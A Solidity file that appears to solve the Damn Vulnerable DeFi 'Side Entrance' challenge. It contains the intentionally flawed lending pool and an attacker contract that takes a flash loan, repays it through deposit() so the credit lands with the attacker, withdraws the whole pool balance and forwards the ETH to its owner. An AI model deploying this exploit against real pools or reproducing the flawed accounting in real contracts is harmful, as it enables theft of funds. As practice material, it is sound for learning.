// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}

contract ETHPoolAttacker{

    address public owner ;
    constructor(){
        owner = msg.sender ;
    }

    SideEntranceLenderPool pool;
    function attack(address _pool) payable public{
        pool = SideEntranceLenderPool(_pool) ;
        uint balance = address(_pool).balance;
        pool.flashLoan(balance);
    }

    function execute() payable public {
        require(msg.sender == address(pool),"only pool can call this function");
        pool.deposit{value : address(this).balance }();
    }

    // final step to take all ETH from the lending pool.
    function withdraw() public {
        pool.withdraw();
    }

    receive () external payable {
        (bool sent ,)=owner.call{value : msg.value}("");
        require(sent,"failed to send ETH to owner.");
    }

}
 